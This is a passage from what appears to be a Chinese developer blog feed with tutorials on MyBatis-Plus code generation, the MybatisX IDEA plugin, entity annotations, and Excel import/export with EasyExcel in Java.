class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;bid&quot;</span>, <span class="hljs-string">&quot;created_by&quot;</span>, <span class="hljs-string">&quot;created_at&quot;</span>, <span class="hljs-string">&quot;updated_by&quot;</span>, <span class="hljs-string">&quot;updated_at&quot;</span>, <span class="hljs-string">&quot;deleted&quot;</span>, <span class="hljs-string">&quot;version&quot;</span>)<br>                        .formatFileName(<span class="hljs-string">&quot;%sDO&quot;</span>)<br>                        .disableSerialVersionUID()<br>                        .enableChainModel()<br>                        .enableLombok()<br>                        .enableTableFieldAnnotation()<br>                        .versionColumnName(<span class="hljs-string">&quot;version&quot;</span>)<br>                        <span class="hljs-comment">// 逻辑删除字段</span><br>                        .logicDeleteColumnName(<span class="hljs-string">&quot;deleted&quot;</span>)<br>                        <span class="hljs-comment">// 设置字段映射为下划线转驼峰</span><br>                        .naming(NamingStrategy.underline_to_camel)<br>                        .columnNaming(NamingStrategy.underline_to_camel)<br>                        <span class="hljs-comment">// -- Controller --</span><br>                        .controllerBuilder()<br>                        .enableHyphenStyle()<br>                        .enableRestStyle()<br>                        .formatFileName(<span class="hljs-string">&quot;%sController&quot;</span>)<br>                        <span class="hljs-comment">// -- Service 策略配置 --</span><br>                        .serviceBuilder()<br>                        .superServiceClass(MPJBaseService.class)<br>                        .superServiceImplClass(MPJBaseServiceImpl.class)<br>                        .formatServiceFileName(<span class="hljs-string">&quot;%sService&quot;</span>)<br>                        .formatServiceImplFileName(<span class="hljs-string">&quot;%sServiceImpl&quot;</span>)<br>                        <span class="hljs-comment">// -- Mapper 策略配置 --</span><br>                        .mapperBuilder()<br>                        .superClass(MPJBaseMapper.class)<br>                        .enableMapperAnnotation()<br>                        .enableBaseResultMap()<br>                        .enableBaseColumnList()<br>                        .formatMapperFileName(<span class="hljs-string">&quot;%sMapper&quot;</span>)<br>                        .formatXmlFileName(<span class="hljs-string">&quot;%sMapper&quot;</span>))<br>            <span class="hljs-comment">// 使用freemaker模板引擎, 需引入对应依赖</span><br>                .templateEngine(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FreemarkerTemplateEngine</span>())<br>                <span class="hljs-comment">// 执行</span><br>                .execute();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><blockquote><p>注：以上包含配置可参阅 <a href="https://baomidou.com/pages/981406/#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE-datasourceconfig">代码生成器配置新 | MyBatis-Plus</a> 进行自定义</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CRUD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mybatis Plus提升CRUD效率（一）</title>
    <link href="/2023/07/06/Mybatis%20Plus%E6%8F%90%E5%8D%87CRUD%E6%95%88%E7%8E%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2023/07/06/Mybatis%20Plus%E6%8F%90%E5%8D%87CRUD%E6%95%88%E7%8E%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="一、MybatisX-插件"><a href="#一、MybatisX-插件" class="headerlink" title="一、MybatisX 插件"></a>一、MybatisX 插件</h1><p>MyBatisX插件是<a href="https://so.csdn.net/so/search?q=IDEA%E6%8F%92%E4%BB%B6&spm=1001.2101.3001.7020">IDEA插件</a>，如果想要使用它，那么首先需要在IDEA中进行安装（Markplace搜索安装即可)。</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679233048370.png" alt="1679233048370"></p><h2 id="1、插件用途：接口与-mapper-xml-跳转"><a href="#1、插件用途：接口与-mapper-xml-跳转" class="headerlink" title="1、插件用途：接口与 mapper.xml 跳转"></a>1、插件用途：接口与 mapper.xml 跳转</h2><p>安装插件后，在mapper的接口文件中，会出现红色小鸟标识（如下图），点击即可跳转至对应 <code>mapper.xml</code> 文件的映射方法。</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679233319537.png" alt="1679233319537"></p><p>同样，在 <code>mapper.xml</code> 文件中也会出现蓝色小鸟标识（如下图），点击即可跳转至对应<code>mapper</code> 接口。</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679233427492.png" alt="1679233427492"></p><h2 id="2、插件进阶用途I：代码快速生成"><a href="#2、插件进阶用途I：代码快速生成" class="headerlink" title="2、插件进阶用途I：代码快速生成"></a>2、插件进阶用途I：代码快速生成</h2><p>首先，需要在IDEA中配置对应的数据库链接：</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679233625098.png" alt="1679233625098"></p><p>找到需要生成代码的表名，右键选择 <code>Mybatis-X</code> 菜单，</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679233802961.png" alt="1679233802961"></p><p>接着按以下提示依次填写相应内容，即可在对应目录生成表所对应的 <code>mapper</code> 接口、<code>xml</code> 文件（<code>service</code> 部分建议去掉，实际开发用处不大）。</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679233899047.png" alt="1679233899047"></p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679233992315.png" alt="1679233992315"></p><h2 id="3、插件进阶用途II：CRUD快速生成"><a href="#3、插件进阶用途II：CRUD快速生成" class="headerlink" title="3、插件进阶用途II：CRUD快速生成"></a>3、插件进阶用途II：CRUD快速生成</h2><p>在代码生成的 <code>mapper</code> 接口中，不需要写返回值，只需要依据以下语法写方法名：</p><blockquote><p>select、query、get —— 查找<br>update —— 更新<br>delete —— 删除<br>by 条件<br>and 连接条件</p></blockquote><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679234674131.png" alt="1679234674131"></p><p>接着按下 <code>Alt</code> + <code>Enter</code> ，选择 <code>Generate Mybatis Sql</code> ，</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679234851285.png" alt="1679234851285"></p><p>即可生成对应方法，以及 <code>xml</code> 文件的语句。</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679234926792.png" alt="1679234926792"></p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679234953410.png" alt="1679234953410"></p><h2 id="4、插件进阶用途III：mybatis-plus-的使用"><a href="#4、插件进阶用途III：mybatis-plus-的使用" class="headerlink" title="4、插件进阶用途III：mybatis-plus 的使用"></a>4、插件进阶用途III：mybatis-plus 的使用</h2><p>我们可以结合 <code>mybatis-plus</code> 进一步提高效率，在第二步代码生成的选项中，我们选择了 <code>Mybatis Plus 3</code> 以后，生成的 <code>mapper</code> 接口会继承 <code>BaseMapper</code> 接口，后续在 <code>service</code> 中就能直接调用 <code>mybatis-plus</code> 封装的方法，这其中包括了单表常见的增删改查，针对单表的操作基本可以告别编写 <code>xml</code> 配置。为此，我们还需要引入 <code>mybatis-plus</code> 的依赖，以使 <code>BaseMapper</code> 接口生效：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- Mybatis-plus 依赖  --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>接下来，就可以在 <code>service</code> 中直接调用 <code>mapper</code> 封装的 CRUD 接口了。当然，在实际应用中仍然要结合具体情况，复杂单表操作仍建议使用 <code>xml</code> 配置，便于维护。</p><p><img src="/../blog-assets/EasyExcel%E7%94%A8%E6%B3%95/1679236285692.png" alt="1679236285692"></p><h1 id="二、Mybatis-Plus"><a href="#二、Mybatis-Plus" class="headerlink" title="二、Mybatis Plus"></a>二、Mybatis Plus</h1><blockquote><ul><li>此处只大致介绍Mybatis Plus，详细应用请移步官方文档</li><li>Mybatis Plus 官方参考文档： <a href="https://baomidou.com/">MyBatis-Plus (baomidou.com)</a></li></ul></blockquote><h2 id="1-MP-实体类"><a href="#1-MP-实体类" class="headerlink" title="1. MP 实体类"></a>1. MP 实体类</h2><p>使用注解将实体类 T entity与Mybatis Plus（下称MP）封装好的接口配合使用，这里以一个基础实体类 <code>BaseDO</code> 举例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@TableName(&quot;sys_user&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BaseDO</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 主键ID</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;主键ID&quot;)</span><br>    <span class="hljs-meta">@TableId(value = &quot;id&quot;, type = IdType.AUTO)</span><br>    <span class="hljs-keyword">private</span> Long id;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 业务主键</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;业务主键&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;bid&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-keyword">private</span> Long bid;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建时间</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;创建时间&quot;)</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;create_at&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-keyword">private</span> Date createAt;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 创建人</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;创建人&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;create_by&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-keyword">private</span> String createBy;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新时间</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;更新时间&quot;)</span><br>    <span class="hljs-meta">@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;update_at&quot;, fill = FieldFill.INSERT_UPDATE)</span><br>    <span class="hljs-keyword">private</span> Date updateAt;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 更新人</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;更新人&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;update_by&quot;, fill = FieldFill.INSERT_UPDATE)</span><br>    <span class="hljs-keyword">private</span> String updateBy;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 逻辑删除 0-未删除 1-已删除</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ApiModelProperty(&quot;逻辑删除&quot;)</span><br>    <span class="hljs-meta">@TableField(value = &quot;deleted&quot;, fill = FieldFill.INSERT)</span><br>    <span class="hljs-meta">@TableLogic(value = &quot;0&quot;, delval = &quot;1&quot;)</span><br>    <span class="hljs-keyword">private</span> Integer deleted;<br>  <br>    <span class="hljs-meta">@ApiModelProperty(hidden = true)</span><br>    <span class="hljs-meta">@TableField(exist = false)</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="TableName"><a href="#TableName" class="headerlink" title="@TableName"></a>@TableName</h3><ul><li>描述：表名注解，标识实体类对应的表</li><li>使用位置：实体类</li><li>多数据库需指定库名</li></ul><h3 id="TableId"><a href="#TableId" class="headerlink" title="@TableId"></a>@TableId</h3><ul><li>描述：主键注解</li><li>使用位置：实体类主键字段</li></ul><table><thead><tr><th align="left">属性</th><th align="left">类型</th><th align="left">必须指定</th><th align="left">默认值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">value</td><td align="left">String</td><td align="left">否</td><td align="left">“”</td><td align="left">主键字段名</td></tr><tr><td align="left">type</td><td align="left">Enum</td><td align="left">否</td><td align="left">IdType.NONE</td><td align="left">指定主键类型</td></tr></tbody></table><h4 id="IdType"><a href="#IdType" class="headerlink" title="IdType"></a>IdType</h4><table><thead><tr><th align="left">值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">AUTO</td><td align="left">数据库 ID 自增</td></tr><tr><td align="left">NONE</td><td align="left">无状态，该类型为未设置主键类型（注解里等于跟随全局，全局里约等于 INPUT）</td></tr><tr><td align="left">INPUT</td><td align="left">insert 前自行 set 主键值</td></tr></tbody></table><h3 id="TableField"><a href="#TableField" class="headerlink" title="@TableField"></a>@TableField</h3><ul><li>描述：字段注解（非主键）</li></ul><table><thead><tr><th align="left">属性</th><th align="left">类型</th><th align="left">必须指定</th><th align="left">默认值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">value</td><td align="left">String</td><td align="left">否</td><td align="left">“”</td><td align="left">数据库字段名</td></tr><tr><td align="left">exist</td><td align="left">boolean</td><td align="left">否</td><td align="left">true</td><td align="left">是否为数据库表字段</td></tr><tr><td align="left">condition</td><td align="left">String</td><td align="left">否</td><td align="left">“”</td><td align="left">字段<code>where</code> 实体查询比较条件，有值设置则按设置的值为准，没有则为默认全局的 &#96;%s&#x3D;#</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CRUD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>EasyExcel 实现导入导出</title>
    <link href="/2023/03/03/EasyExcel%E5%AE%9E%E7%8E%B0%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"/>
    <url>/2023/03/03/EasyExcel%E5%AE%9E%E7%8E%B0%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>前提：引入 EasyExcel 依赖</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- easyexcel组件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easyexcel<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="1-导出Excel"><a href="#1-导出Excel" class="headerlink" title="1. 导出Excel"></a>1. 导出Excel</h1><h2 id="1-1-导出的实体类"><a href="#1-1-导出的实体类" class="headerlink" title="1.1 导出的实体类"></a>1.1 导出的实体类</h2><p>在该类中定义需要导出的内容，其中</p><blockquote><p><code>@HeadRowHeight</code> ：指定导出行高</p><p><code>@ExcelProperty(value=&#39;标题名称&#39;, index=0)</code> ：指定导出列的名称以及顺序</p><p><code>@ColumnWidth</code> ： 指定导出列的宽度</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 职工信息表</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@TableName</span> staff_info</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@TableName(value =&quot;staff_info&quot;)</span><br><span class="hljs-meta">@HeadRowHeight(value = 30)</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaffInfo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 职工编号</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ExcelProperty(value = &quot;员工ID&quot;, index = 0)</span><br>    <span class="hljs-meta">@ColumnWidth(value = 20)</span><br>    <span class="hljs-keyword">private</span> String staffId;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 职工姓名</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ExcelProperty(value = &quot;员工姓名&quot;, index = 1)</span><br>    <span class="hljs-meta">@ColumnWidth(value = 20)</span><br>    <span class="hljs-keyword">private</span> String staffName;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 年龄</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ExcelProperty(value = &quot;员工年龄&quot;, index = 2)</span><br>    <span class="hljs-meta">@ColumnWidth(value = 20)</span><br>    <span class="hljs-keyword">private</span> Integer staffAge;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 性别</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-meta">@ExcelProperty(value = &quot;员工性别&quot;, index = 3)</span><br>    <span class="hljs-meta">@ColumnWidth(value = 20)</span><br>    <span class="hljs-keyword">private</span> String staffSex;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-按模板导出Excel"><a href="#1-2-按模板导出Excel" class="headerlink" title="1.2 按模板导出Excel"></a>1.2 按模板导出Excel</h2><p>支持多<code>sheet</code> 页导出，在获取 <code>sheet</code> 对象时指定 <code>sheet</code> 页的顺序及名称即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">easyExcelExport</span><span class="hljs-params">(HttpServletResponse response)</span> &#123;<br>    response.setContentType(<span class="hljs-string">&quot;application/vnd.ms-excel&quot;</span>);<br>    response.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> URLEncoder.encode(<span class="hljs-string">&quot;导出xlsx测试&quot;</span>, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        response.setHeader(<span class="hljs-string">&quot;Content-disposition&quot;</span>, <span class="hljs-string">&quot;attachment;filename=&quot;</span> + fileName + <span class="hljs-string">&quot;.xlsx&quot;</span>);<br>        <span class="hljs-comment">//新建ExcelWriter</span><br>        <span class="hljs-type">ExcelWriter</span> <span class="hljs-variable">excelWriter</span> <span class="hljs-operator">=</span> EasyExcel.write(response.getOutputStream()).build();<br>        <span class="hljs-comment">//获取sheet0对象</span><br>        <span class="hljs-type">WriteSheet</span> <span class="hljs-variable">sheet0</span> <span class="hljs-operator">=</span> EasyExcel.writerSheet(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;员工信息-1&quot;</span>).head(StaffInfo.class).build();<br>        <span class="hljs-comment">//获取模型信息,向sheet0写入数据</span><br>        List&lt;StaffInfo&gt; staffInfos = staffInfoMapperl.selectAllByStaffAge(<span class="hljs-number">24</span>);<br>        excelWriter.write(staffInfos, mainSheet);<br>        <span class="hljs-comment">//获取sheet1对象</span><br>        <span class="hljs-type">WriteSheet</span> <span class="hljs-variable">sheet1</span> <span class="hljs-operator">=</span> EasyExcel.writerSheet(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;员工信息-2&quot;</span>).head(StaffInfo.class).build();<br>        <span class="hljs-comment">//获取模型信息,向sheet1写入数据</span><br>        List&lt;StaffInfo&gt; staffInfos1 = staffInfoMapperl.selectAllByStaffAge(<span class="hljs-number">24</span>);<br>        excelWriter.write(staffInfos1, secondSheet);<br>        <span class="hljs-comment">//关闭流</span><br>        excelWriter.finish();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(<span class="hljs-string">&quot;导出异常&#123;&#125;&quot;</span>, e.getMessage());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中测试导出接口，获取导出的Excel文件如下</p><p><img src="/../blog-assets/EasyExcel%E5%AE%9E%E7%8E%B0%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/1679817835049.png" alt="1679817835049"></p><h1 id="2-导入Excel"><a href="#2-导入Excel" class="headerlink" title="2. 导入Excel"></a>2. 导入Excel</h1><h2 id="2-1-导入的实体类"><a href="#2-1-导入的实体类" class="headerlink" title="2.1 导入的实体类"></a>2.1 导入的实体类</h2><p>导入实体类可参考导出实体类，核心注解为 </p><blockquote><p>@ExcelProperty(value&#x3D;”标题名称”)</p></blockquote><p>其中标题名称需要与导入的标题名称对应，才能正确解析</p><h2 id="2-2-ExcelListener-监视器类"><a href="#2-2-ExcelListener-监视器类" class="headerlink" title="2.2 ExcelListener 监视器类"></a>2.2 ExcelListener 监视器类</h2><p>继承自<code>EasyExcel</code>的<code>AnalysisEventListener</code>类，用于解析<code>Excel</code>数据，其中<code>datas</code>为解析内容的<code>List</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * excel表格读取监视器</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> DunkingCurry</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExcelListener</span>&lt;T&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AnalysisEventListener</span>&lt;T&gt; &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">dataCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    List&lt;String&gt; errors = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    List&lt;T&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(T o, AnalysisContext analysisContext)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;成功解析到一条数据:&#123;&#125;&quot;</span>, JSONObject.toJSONString(o));<br>        dataCount++;<br>        data.add(o);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doAfterAllAnalysed</span><span class="hljs-params">(AnalysisContext analysisContext)</span> &#123;<br>        log.info((<span class="hljs-string">&quot;成功读取共&quot;</span> + dataCount + <span class="hljs-string">&quot;条数据&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;T&gt; <span class="hljs-title function_">getData</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> data;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setData</span><span class="hljs-params">(List&lt;T&gt; data)</span> &#123;<br>        <span class="hljs-built_in">this</span>.data = data;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 参数校验</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> data 校验内容</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> offset 提示语行数偏移修正</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 校验结果</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">validate</span><span class="hljs-params">(List&lt;T&gt; data, <span 